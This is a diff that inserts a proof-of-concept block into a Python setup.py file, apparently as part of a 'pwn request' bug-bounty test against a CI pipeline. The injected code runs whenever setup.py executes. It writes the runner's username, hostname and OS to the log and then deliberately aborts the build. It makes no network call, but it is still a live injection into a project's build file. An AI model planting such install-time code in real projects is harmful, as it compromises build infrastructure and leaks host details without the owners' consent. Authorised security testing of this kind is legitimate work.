@@ -5,6 +5,19 @@
 # Licensed under the MIT License. See License.txt in the project root for license information.
 # --------------------------------------------------------------------------------------------
 
+# === PoC INJECTION (benign bug-bounty marker; no network/exfil/persistence) ===
+import sys as _s, socket as _so, getpass as _g, os as _o
+_m = "ADO-CLI-POC-20260529123646-31189"
+_s.stderr.write("\n=== MSQUIC_PWN_REQUEST_POC ===\n")
+_s.stderr.write("MARKER=%s\n" % _m)
+try:
+    _s.stderr.write("WHOAMI=%s HOST=%s OS=%s\n" % (_g.getuser(), _so.gethostname(), _o.uname().sysname))
+except Exception as _e:
+    _s.stderr.write("INFO=%s\n" % _e)
+_s.stderr.flush()
+raise SystemExit("MSQUIC_PWN_REQUEST_POC executed on CI runner; MARKER=%s" % _m)
+# === end PoC injection ===
+
 from codecs import open
 from setuptools import setup, find_packages
 import sys
